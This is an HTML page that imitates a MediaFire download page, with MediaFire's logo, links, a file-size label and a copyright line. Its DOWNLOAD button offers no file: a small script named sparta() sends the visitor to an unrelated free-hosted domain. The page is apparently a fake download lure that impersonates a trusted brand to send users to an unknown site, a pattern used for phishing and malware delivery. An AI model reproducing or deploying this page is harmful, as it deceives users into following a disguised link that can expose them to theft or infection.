<!DOCTYPE html>
<html lang="en">

<head>
    <title>Mediafire Lite</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Bootstrap core CSS -->
    <link href="https://raw.githubusercontent.com/KazuoYK/mediafire-lite/main/css/styles.css" rel="stylesheet">
    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }
    </style>
</head>

<body>
    <main>
        <div class="container py-4" style="text-align:center;">
            <header class="pb-3 mb-4 border-bottom">
                <a href="https://mediafire.com" class="d-flex align-items-center text-dark text-decoration-none">
                    <span class="fs-4"><img src="https://raw.githubusercontent.com/KazuoYK/mediafire-lite/main/img/mf_logo_full_color.png"></span>
                </a>
            </header>
            <div class="p-5 mb-4 text-white bg-dark rounded-3">
                <div class="container-fluid py-5">
                    <span class="fs-4"><img src="https://raw.githubusercontent.com/KazuoYK/mediafire-lite/main/img/file-zip-v3.png"></span>
                    <br>
                    <!-- <p class="col-md-12 fs-4">Download your file...</p> -->
                    <p class="col-md-12 fs-4">2 mb</p>
                    <br>
                    <button class="btn btn-primary btn-lg" type="button" onclick="sparta()">DOWNLOAD</button>
                </div>
            </div>
            <script>
                function sparta() {
                    window.open("https://ryuxyro.epizy.com", '_self');
                }
            </script>
            <br>
            <br>
            <br>
            <footer class="pt-3 mt-4 text-muted border-top">
                Copyright &copy; 2016 <a href="https://mediafire.com">Mediafire Lite</a>
            </footer>
        </div>
    </main>
</body>

</html>
